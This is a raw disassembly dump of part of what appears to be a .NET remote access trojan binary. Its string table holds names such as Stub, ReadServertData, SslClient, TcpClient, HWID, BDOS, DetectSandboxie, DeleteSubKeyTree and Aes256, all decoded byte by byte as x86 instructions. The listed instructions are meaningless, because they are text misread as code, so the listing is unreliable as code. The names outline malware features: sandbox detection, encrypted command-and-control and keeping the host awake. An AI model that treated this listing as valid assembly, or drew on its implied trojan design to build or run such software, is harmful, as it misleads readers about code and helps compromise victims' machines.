  40753f:	74 61                	je     0x4075a2
  407541:	74 69                	je     0x4075ac
  407543:	63 41 72             	arpl   %eax,0x72(%ecx)
  407546:	72 61                	jb     0x4075a9
  407548:	79 49                	jns    0x407593
  40754a:	6e                   	outsb  %ds:(%esi),(%dx)
  40754b:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407552:	69 
  407553:	7a 65                	jp     0x4075ba
  407555:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  40755a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407561:	74 2e                	je     0x407591
  407563:	57                   	push   %edi
  407564:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40756b:	55                   	push   %ebp
  40756c:	49                   	dec    %ecx
  40756d:	6e                   	outsb  %ds:(%esi),(%dx)
  40756e:	74 33                	je     0x4075a3
  407570:	32 00                	xor    (%eax),%al
  407572:	54                   	push   %esp
  407573:	6f                   	outsl  %ds:(%esi),(%dx)
  407574:	49                   	dec    %ecx
  407575:	6e                   	outsb  %ds:(%esi),(%dx)
  407576:	74 33                	je     0x4075ab
  407578:	32 00                	xor    (%eax),%al
  40757a:	53                   	push   %ebx
  40757b:	77 61                	ja     0x4075de
  40757d:	70 49                	jo     0x4075c8
  40757f:	6e                   	outsb  %ds:(%esi),(%dx)
  407580:	74 33                	je     0x4075b5
  407582:	32 00                	xor    (%eax),%al
  407584:	3c 3e                	cmp    $0x3e,%al
  407586:	6f                   	outsl  %ds:(%esi),(%dx)
  407587:	5f                   	pop    %edi
  407588:	5f                   	pop    %edi
  407589:	32 00                	xor    (%eax),%al
  40758b:	61                   	popa
  40758c:	32 00                	xor    (%eax),%al
  40758e:	58                   	pop    %eax
  40758f:	35 30 39 43 65       	xor    $0x65433930,%eax
  407594:	72 74                	jb     0x40760a
  407596:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40759d:	32 00                	xor    (%eax),%al
  40759f:	76 32                	jbe    0x4075d3
  4075a1:	00 76 33             	add    %dh,0x33(%esi)
  4075a4:	00 57 72             	add    %dl,0x72(%edi)
  4075a7:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4075ae:	36 
  4075af:	34 00                	xor    $0x0,%al
  4075b1:	54                   	push   %esp
  4075b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4075b3:	55                   	push   %ebp
  4075b4:	49                   	dec    %ecx
  4075b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4075b6:	74 36                	je     0x4075ee
  4075b8:	34 00                	xor    $0x0,%al
  4075ba:	47                   	inc    %edi
  4075bb:	65 74 41             	gs je  0x4075ff
  4075be:	73 55                	jae    0x407615
  4075c0:	49                   	dec    %ecx
  4075c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4075c2:	74 36                	je     0x4075fa
  4075c4:	34 00                	xor    $0x0,%al
  4075c6:	53                   	push   %ebx
  4075c7:	65 74 41             	gs je  0x40760b
  4075ca:	73 55                	jae    0x407621
  4075cc:	49                   	dec    %ecx
  4075cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4075ce:	74 36                	je     0x407606
  4075d0:	34 00                	xor    $0x0,%al
  4075d2:	54                   	push   %esp
  4075d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4075d4:	49                   	dec    %ecx
  4075d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4075d6:	74 36                	je     0x40760e
  4075d8:	34 00                	xor    $0x0,%al
  4075da:	53                   	push   %ebx
  4075db:	77 61                	ja     0x40763e
  4075dd:	70 49                	jo     0x407628
  4075df:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e0:	74 36                	je     0x407618
  4075e2:	34 00                	xor    $0x0,%al
  4075e4:	54                   	push   %esp
  4075e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4075e6:	55                   	push   %ebp
  4075e7:	49                   	dec    %ecx
  4075e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e9:	74 31                	je     0x40761c
  4075eb:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  4075f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4075f1:	74 31                	je     0x407624
  4075f3:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  4075f7:	61                   	popa
  4075f8:	70 49                	jo     0x407643
  4075fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4075fb:	74 31                	je     0x40762e
  4075fd:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407601:	41                   	inc    %ecx
  407602:	43                   	inc    %ebx
  407603:	53                   	push   %ebx
  407604:	48                   	dec    %eax
  407605:	41                   	inc    %ecx
  407606:	32 35 36 00 53 68    	xor    0x68530036,%dh
  40760c:	61                   	popa
  40760d:	32 35 36 00 41 65    	xor    0x65410036,%dh
  407613:	73 32                	jae    0x407647
  407615:	35 36 00 61 65       	xor    $0x65610036,%eax
  40761a:	73 32                	jae    0x40764e
  40761c:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407621:	53                   	push   %ebx
  407622:	74 61                	je     0x407685
  407624:	74 69                	je     0x40768f
  407626:	63 41 72             	arpl   %eax,0x72(%ecx)
  407629:	72 61                	jb     0x40768c
  40762b:	79 49                	jns    0x407676
  40762d:	6e                   	outsb  %ds:(%esi),(%dx)
  40762e:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407635:	69 
  407636:	7a 65                	jp     0x40769d
  407638:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  40763d:	74 5f                	je     0x40769e
  40763f:	55                   	push   %ebp
  407640:	54                   	push   %esp
  407641:	46                   	inc    %esi
  407642:	38 00                	cmp    %al,(%eax)
  407644:	3c 4d                	cmp    $0x4d,%al
  407646:	6f                   	outsl  %ds:(%esi),(%dx)
  407647:	64 75 6c             	fs jne 0x4076b6
  40764a:	65 3e 00 3c 50       	gs add %bh,%ds:(%eax,%edx,2)
  40764f:	72 69                	jb     0x4076ba
  407651:	76 61                	jbe    0x4076b4
  407653:	74 65                	je     0x4076ba
  407655:	49                   	dec    %ecx
  407656:	6d                   	insl   (%dx),%es:(%edi)
  407657:	70 6c                	jo     0x4076c5
  407659:	65 6d                	gs insl (%dx),%es:(%edi)
  40765b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40765d:	74 61                	je     0x4076c0
  40765f:	74 69                	je     0x4076ca
  407661:	6f                   	outsl  %ds:(%esi),(%dx)
  407662:	6e                   	outsb  %ds:(%esi),(%dx)
  407663:	44                   	inc    %esp
  407664:	65 74 61             	gs je  0x4076c8
  407667:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40766e:	42 
  40766f:	32 41 31             	xor    0x31(%ecx),%al
  407672:	46                   	inc    %esi
  407673:	39 39                	cmp    %edi,(%ecx)
  407675:	30 32                	xor    %dh,(%edx)
  407677:	42                   	inc    %edx
  407678:	33 35 46 38 46 38    	xor    0x38463846,%esi
  40767e:	38 30                	cmp    %dh,(%eax)
  407680:	45                   	inc    %ebp
  407681:	46                   	inc    %esi
  407682:	31 36                	xor    %esi,(%esi)
  407684:	39 32                	cmp    %esi,(%edx)
  407686:	43                   	inc    %ebx
  407687:	45                   	inc    %ebp
  407688:	39 39                	cmp    %edi,(%ecx)
  40768a:	34 37                	xor    $0x37,%al
  40768c:	41                   	inc    %ecx
  40768d:	31 39                	xor    %edi,(%ecx)
  40768f:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  407693:	36 39 38             	cmp    %edi,%ss:(%eax)
  407696:	44                   	inc    %esp
  407697:	38 46 35             	cmp    %al,0x35(%esi)
  40769a:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  40769e:	41                   	inc    %ecx
  40769f:	37                   	aaa
  4076a0:	32 31                	xor    (%ecx),%dh
  4076a2:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4076a8:	43                   	inc    %ebx
  4076a9:	35 38 42 00 47       	xor    $0x47004238,%eax
  4076ae:	43                   	inc    %ebx
  4076af:	00 45 53             	add    %al,0x53(%ebp)
  4076b2:	5f                   	pop    %edi
  4076b3:	53                   	push   %ebx
  4076b4:	59                   	pop    %ecx
  4076b5:	53                   	push   %ebx
  4076b6:	54                   	push   %esp
  4076b7:	45                   	inc    %ebp
  4076b8:	4d                   	dec    %ebp
  4076b9:	5f                   	pop    %edi
  4076ba:	52                   	push   %edx
  4076bb:	45                   	inc    %ebp
  4076bc:	51                   	push   %ecx
  4076bd:	55                   	push   %ebp
  4076be:	49                   	dec    %ecx
  4076bf:	52                   	push   %edx
  4076c0:	45                   	inc    %ebp
  4076c1:	44                   	inc    %esp
  4076c2:	00 45 53             	add    %al,0x53(%ebp)
  4076c5:	5f                   	pop    %edi
  4076c6:	44                   	inc    %esp
  4076c7:	49                   	dec    %ecx
  4076c8:	53                   	push   %ebx
  4076c9:	50                   	push   %eax
  4076ca:	4c                   	dec    %esp
  4076cb:	41                   	inc    %ecx
  4076cc:	59                   	pop    %ecx
  4076cd:	5f                   	pop    %edi
  4076ce:	52                   	push   %edx
  4076cf:	45                   	inc    %ebp
  4076d0:	51                   	push   %ecx
  4076d1:	55                   	push   %ebp
  4076d2:	49                   	dec    %ecx
  4076d3:	52                   	push   %edx
  4076d4:	45                   	inc    %ebp
  4076d5:	44                   	inc    %esp
  4076d6:	00 4d 61             	add    %cl,0x61(%ebp)
  4076d9:	70 4e                	jo     0x407729
  4076db:	61                   	popa
  4076dc:	6d                   	insl   (%dx),%es:(%edi)
  4076dd:	65 54                	gs push %esp
  4076df:	6f                   	outsl  %ds:(%esi),(%dx)
  4076e0:	4f                   	dec    %edi
  4076e1:	49                   	dec    %ecx
  4076e2:	44                   	inc    %esp
  4076e3:	00 48 57             	add    %cl,0x57(%eax)
  4076e6:	49                   	dec    %ecx
  4076e7:	44                   	inc    %esp
  4076e8:	00 67 65             	add    %ah,0x65(%edi)
  4076eb:	74 5f                	je     0x40774c
  4076ed:	46                   	inc    %esi
  4076ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ef:	72 6d                	jb     0x40775e
  4076f1:	61                   	popa
  4076f2:	74 49                	je     0x40773d
  4076f4:	44                   	inc    %esp
  4076f5:	00 45 58             	add    %al,0x58(%ebp)
  4076f8:	45                   	inc    %ebp
  4076f9:	43                   	inc    %ebx
  4076fa:	55                   	push   %ebp
  4076fb:	54                   	push   %esp
  4076fc:	49                   	dec    %ecx
  4076fd:	4f                   	dec    %edi
  4076fe:	4e                   	dec    %esi
  4076ff:	5f                   	pop    %edi
  407700:	53                   	push   %ebx
  407701:	54                   	push   %esp
  407702:	41                   	inc    %ecx
  407703:	54                   	push   %esp
  407704:	45                   	inc    %ebp
  407705:	00 38                	add    %bh,(%eax)
  407707:	37                   	aaa
  407708:	36 33 39             	xor    %ss:(%ecx),%edi
  40770b:	31 32                	xor    %esi,(%edx)
  40770d:	36 45                	ss inc %ebp
  40770f:	41                   	inc    %ecx
  407710:	37                   	aaa
  407711:	37                   	aaa
  407712:	42                   	inc    %edx
  407713:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407719:	35 33 32 33 36       	xor    $0x36333233,%eax
  40771e:	37                   	aaa
  40771f:	44                   	inc    %esp
  407720:	42                   	inc    %edx
  407721:	41                   	inc    %ecx
  407722:	36 37                	ss aaa
  407724:	43                   	inc    %ebx
  407725:	35 33 31 30 45       	xor    $0x45303133,%eax
  40772a:	46                   	inc    %esi
  40772b:	35 30 41 38 44       	xor    $0x44384130,%eax
  407730:	39 38                	cmp    %edi,(%eax)
  407732:	38 38                	cmp    %bh,(%eax)
  407734:	45                   	inc    %ebp
  407735:	44                   	inc    %esp
  407736:	30 37                	xor    %dh,(%edi)
  407738:	30 43 44             	xor    %al,0x44(%ebx)
  40773b:	34 30                	xor    $0x30,%al
  40773d:	45                   	inc    %ebp
  40773e:	31 46 36             	xor    %eax,0x36(%esi)
  407741:	30 35 41 38 46 00    	xor    %dh,0x463841
  407747:	67 65 74 5f          	addr16 gs je 0x4077aa
  40774b:	41                   	inc    %ecx
  40774c:	53                   	push   %ebx
  40774d:	43                   	inc    %ebx
  40774e:	49                   	dec    %ecx
  40774f:	49                   	dec    %ecx
  407750:	00 53 79             	add    %dl,0x79(%ebx)
  407753:	73 74                	jae    0x4077c9
  407755:	65 6d                	gs insl (%dx),%es:(%edi)
  407757:	2e 49                	cs dec %ecx
  407759:	4f                   	dec    %edi
  40775a:	00 49 73             	add    %cl,0x73(%ecx)
  40775d:	58                   	pop    %eax
  40775e:	50                   	push   %eax
  40775f:	00 42 44             	add    %al,0x44(%edx)
  407762:	4f                   	dec    %edi
  407763:	53                   	push   %ebx
  407764:	00 45 53             	add    %al,0x53(%ebp)
  407767:	5f                   	pop    %edi
  407768:	43                   	inc    %ebx
  407769:	4f                   	dec    %edi
  40776a:	4e                   	dec    %esi
  40776b:	54                   	push   %esp
  40776c:	49                   	dec    %ecx
  40776d:	4e                   	dec    %esi
  40776e:	55                   	push   %ebp
  40776f:	4f                   	dec    %edi
  407770:	55                   	push   %ebp
  407771:	53                   	push   %ebx
  407772:	00 67 65             	add    %ah,0x65(%edi)
  407775:	74 5f                	je     0x4077d6
  407777:	49                   	dec    %ecx
  407778:	56                   	push   %esi
  407779:	00 73 65             	add    %dh,0x65(%ebx)
  40777c:	74 5f                	je     0x4077dd
  40777e:	49                   	dec    %ecx
  40777f:	56                   	push   %esi
  407780:	00 47 65             	add    %al,0x65(%edi)
  407783:	6e                   	outsb  %ds:(%esi),(%dx)
  407784:	65 72 61             	gs jb  0x4077e8
  407787:	74 65                	je     0x4077ee
  407789:	49                   	dec    %ecx
  40778a:	56                   	push   %esi
  40778b:	00 4d 54             	add    %cl,0x54(%ebp)
  40778e:	58                   	pop    %eax
  40778f:	00 76 61             	add    %dh,0x61(%esi)
  407792:	6c                   	insb   (%dx),%es:(%edi)
  407793:	75 65                	jne    0x4077fa
  407795:	5f                   	pop    %edi
  407796:	5f                   	pop    %edi
  407797:	00 52 65             	add    %dl,0x65(%edx)
  40779a:	61                   	popa
  40779b:	64 53                	fs push %ebx
  40779d:	65 72 76             	gs jb  0x407816
  4077a0:	65 72 74             	gs jb  0x407817
  4077a3:	44                   	inc    %esp
  4077a4:	61                   	popa
  4077a5:	74 61                	je     0x407808
  4077a7:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  4077ab:	61                   	popa
  4077ac:	00 6d 73             	add    %ch,0x73(%ebp)
  4077af:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4077b2:	6c                   	insb   (%dx),%es:(%edi)
  4077b3:	69 62 00 53 74 75 62 	imul   $0x62757453,0x0(%edx),%esp
  4077ba:	00 53 79             	add    %dl,0x79(%ebx)
  4077bd:	73 74                	jae    0x407833
  4077bf:	65 6d                	gs insl (%dx),%es:(%edi)
  4077c1:	2e 43                	cs inc %ebx
  4077c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4077c4:	6c                   	insb   (%dx),%es:(%edi)
  4077c5:	6c                   	insb   (%dx),%es:(%edi)
  4077c6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4077cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4077cc:	73 2e                	jae    0x4077fc
  4077ce:	47                   	inc    %edi
  4077cf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4077d1:	65 72 69             	gs jb  0x40783d
  4077d4:	63 00                	arpl   %eax,(%eax)
  4077d6:	4d                   	dec    %ebp
  4077d7:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4077de:	74 2e                	je     0x40780e
  4077e0:	56                   	push   %esi
  4077e1:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4077e8:	73 69                	jae    0x407853
  4077ea:	63 00                	arpl   %eax,(%eax)
  4077ec:	67 65 74 5f          	addr16 gs je 0x40784f
  4077f0:	53                   	push   %ebx
  4077f1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4077f3:	64 53                	fs push %ebx
  4077f5:	79 6e                	jns    0x407865
  4077f7:	63 00                	arpl   %eax,(%eax)
  4077f9:	67 65 74 5f          	addr16 gs je 0x40785c
  4077fd:	49                   	dec    %ecx
  4077fe:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  407802:	64 52                	fs push %edx
  407804:	65 61                	gs popa
  407806:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  40780a:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407811:	00 
  407812:	54                   	push   %esp
  407813:	68 72 65 61 64       	push   $0x64616572
  407818:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  40781c:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407820:	6e                   	outsb  %ds:(%esi),(%dx)
  407821:	65 72 41             	gs jb  0x407865
  407824:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407829:	41                   	inc    %ecx
  40782a:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407830:	61                   	popa
  407831:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407837:	74 5f                	je     0x407898
  407839:	43                   	inc    %ebx
  40783a:	6f                   	outsl  %ds:(%esi),(%dx)
  40783b:	6e                   	outsb  %ds:(%esi),(%dx)
  40783c:	6e                   	outsb  %ds:(%esi),(%dx)
  40783d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407842:	00 67 65             	add    %ah,0x65(%edi)
  407845:	74 5f                	je     0x4078a6
  407847:	49                   	dec    %ecx
  407848:	73 43                	jae    0x40788d
  40784a:	6f                   	outsl  %ds:(%esi),(%dx)
  40784b:	6e                   	outsb  %ds:(%esi),(%dx)
  40784c:	6e                   	outsb  %ds:(%esi),(%dx)
  40784d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407852:	00 73 65             	add    %dh,0x65(%ebx)
  407855:	74 5f                	je     0x4078b6
  407857:	49                   	dec    %ecx
  407858:	73 43                	jae    0x40789d
  40785a:	6f                   	outsl  %ds:(%esi),(%dx)
  40785b:	6e                   	outsb  %ds:(%esi),(%dx)
  40785c:	6e                   	outsb  %ds:(%esi),(%dx)
  40785d:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407862:	00 52 65             	add    %dl,0x65(%edx)
  407865:	63 65 69             	arpl   %esp,0x69(%ebp)
  407868:	76 65                	jbe    0x4078cf
  40786a:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40786e:	74 5f                	je     0x4078cf
  407870:	47                   	inc    %edi
  407871:	75 69                	jne    0x4078dc
  407873:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407877:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  40787e:	64 
  40787f:	53                   	push   %ebx
  407880:	79 6e                	jns    0x4078f0
  407882:	63 3e                	arpl   %edi,(%esi)
  407884:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407888:	61                   	popa
  407889:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40788c:	6e                   	outsb  %ds:(%esi),(%dx)
  40788d:	67 46                	addr16 inc %esi
  40788f:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407896:	73 43                	jae    0x4078db
  407898:	6f                   	outsl  %ds:(%esi),(%dx)
  407899:	6e                   	outsb  %ds:(%esi),(%dx)
  40789a:	6e                   	outsb  %ds:(%esi),(%dx)
  40789b:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4078a0:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4078a5:	61                   	popa
  4078a6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4078a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078aa:	67 46                	addr16 inc %esi
  4078ac:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  4078b3:	65 65 70 41          	gs gs jo 0x4078f8
  4078b7:	6c                   	insb   (%dx),%es:(%edi)
  4078b8:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4078bf:	42                   	inc    %edx
  4078c0:	61                   	popa
  4078c1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4078c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4078c5:	67 46                	addr16 inc %esi
  4078c7:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  4078ce:	65 61                	gs popa
  4078d0:	64 65 72 53          	fs gs jb 0x407927
  4078d4:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  4078db:	42                   	inc    %edx
  4078dc:	61                   	popa
  4078dd:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4078e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e1:	67 46                	addr16 inc %esi
  4078e3:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4078ea:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4078f1:	42                   	inc    %edx
  4078f2:	61                   	popa
  4078f3:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4078f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f7:	67 46                	addr16 inc %esi
  4078f9:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 65                	je     0x407968
  407903:	72 76                	jb     0x40797b
  407905:	61                   	popa
  407906:	6c                   	insb   (%dx),%es:(%edi)
  407907:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  40790c:	61                   	popa
  40790d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407910:	6e                   	outsb  %ds:(%esi),(%dx)
  407911:	67 46                	addr16 inc %esi
  407913:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  40791a:	75 66                	jne    0x407982
  40791c:	66 65 72 3e          	data16 gs jb 0x40795e
  407920:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407924:	61                   	popa
  407925:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407928:	6e                   	outsb  %ds:(%esi),(%dx)
  407929:	67 46                	addr16 inc %esi
  40792b:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407932:	66 66 73 65          	data16 data16 jae 0x40799b
  407936:	74 3e                	je     0x407976
  407938:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40793c:	61                   	popa
  40793d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407940:	6e                   	outsb  %ds:(%esi),(%dx)
  407941:	67 46                	addr16 inc %esi
  407943:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  40794a:	73 6c                	jae    0x4079b8
  40794c:	43                   	inc    %ebx
  40794d:	6c                   	insb   (%dx),%es:(%edi)
  40794e:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407955:	5f                   	pop    %edi
  407956:	42                   	inc    %edx
  407957:	61                   	popa
  407958:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40795b:	6e                   	outsb  %ds:(%esi),(%dx)
  40795c:	67 46                	addr16 inc %esi
  40795e:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407965:	63 70 43             	arpl   %esi,0x43(%eax)
  407968:	6c                   	insb   (%dx),%es:(%edi)
  407969:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407970:	5f                   	pop    %edi
  407971:	42                   	inc    %edx
  407972:	61                   	popa
  407973:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407976:	6e                   	outsb  %ds:(%esi),(%dx)
  407977:	67 46                	addr16 inc %esi
  407979:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407980:	6e                   	outsb  %ds:(%esi),(%dx)
  407981:	65 72 41             	gs jb  0x4079c5
  407984:	64 64 4d             	fs fs dec %ebp
  407987:	61                   	popa
  407988:	70 43                	jo     0x4079cd
  40798a:	68 69 6c 64 00       	push   $0x646c69
  40798f:	49                   	dec    %ecx
  407990:	6e                   	outsb  %ds:(%esi),(%dx)
  407991:	6e                   	outsb  %ds:(%esi),(%dx)
  407992:	65 72 41             	gs jb  0x4079d6
  407995:	64 64 41             	fs fs inc %ecx
  407998:	72 72                	jb     0x407a0c
  40799a:	61                   	popa
  40799b:	79 43                	jns    0x4079e0
  40799d:	68 69 6c 64 00       	push   $0x646c69
  4079a2:	53                   	push   %ebx
  4079a3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4079a5:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  4079a9:	70 65                	jo     0x407a10
  4079ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4079ac:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4079b0:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4079b7:	61 
  4079b8:	6c                   	insb   (%dx),%es:(%edi)
  4079b9:	75 65                	jne    0x407a20
  4079bb:	4b                   	dec    %ebx
  4079bc:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  4079c3:	6c                   	insb   (%dx),%es:(%edi)
  4079c4:	61                   	popa
  4079c5:	63 65 00             	arpl   %esp,0x0(%ebp)
  4079c8:	43                   	inc    %ebx
  4079c9:	72 65                	jb     0x407a30
  4079cb:	61                   	popa
  4079cc:	74 65                	je     0x407a33
  4079ce:	49                   	dec    %ecx
  4079cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4079d0:	73 74                	jae    0x407a46
  4079d2:	61                   	popa
  4079d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4079d4:	63 65 00             	arpl   %esp,0x0(%ebp)
  4079d7:	73 65                	jae    0x407a3e
  4079d9:	74 5f                	je     0x407a3a
  4079db:	4d                   	dec    %ebp
  4079dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4079dd:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  4079e2:	6c                   	insb   (%dx),%es:(%edi)
  4079e3:	65 4d                	gs dec %ebp
  4079e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e6:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  4079eb:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  4079f2:	64 65 
  4079f4:	00 45 6e             	add    %al,0x6e(%ebp)
  4079f7:	74 65                	je     0x407a5e
  4079f9:	72 44                	jb     0x407a3f
  4079fb:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4079ff:	4d                   	dec    %ebp
  407a00:	6f                   	outsl  %ds:(%esi),(%dx)
  407a01:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407a06:	79 70                	jns    0x407a78
  407a08:	74 6f                	je     0x407a79
  407a0a:	53                   	push   %ebx
  407a0b:	74 72                	je     0x407a7f
  407a0d:	65 61                	gs popa
  407a0f:	6d                   	insl   (%dx),%es:(%edi)
  407a10:	4d                   	dec    %ebp
  407a11:	6f                   	outsl  %ds:(%esi),(%dx)
  407a12:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407a17:	6d                   	insl   (%dx),%es:(%edi)
  407a18:	70 72                	jo     0x407a8c
  407a1a:	65 73 73             	gs jae 0x407a90
  407a1d:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407a24:	00 43 69             	add    %al,0x69(%ebx)
  407a27:	70 68                	jo     0x407a91
  407a29:	65 72 4d             	gs jb  0x407a79
  407a2c:	6f                   	outsl  %ds:(%esi),(%dx)
  407a2d:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407a32:	6c                   	insb   (%dx),%es:(%edi)
  407a33:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407a38:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407a3d:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407a41:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407a44:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407a49:	65 74 65             	gs je  0x407ab1
  407a4c:	53                   	push   %ebx
  407a4d:	75 62                	jne    0x407ab1
  407a4f:	4b                   	dec    %ebx
  407a50:	65 79 54             	gs jns 0x407aa7
  407a53:	72 65                	jb     0x407aba
  407a55:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407a59:	74 5f                	je     0x407aba
  407a5b:	4d                   	dec    %ebp
  407a5c:	65 73 73             	gs jae 0x407ad2
  407a5f:	61                   	popa
  407a60:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407a65:	74 65                	je     0x407acc
  407a67:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407a6b:	6e                   	outsb  %ds:(%esi),(%dx)
  407a6c:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407a70:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407a77:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407a7b:	45                   	inc    %ebp
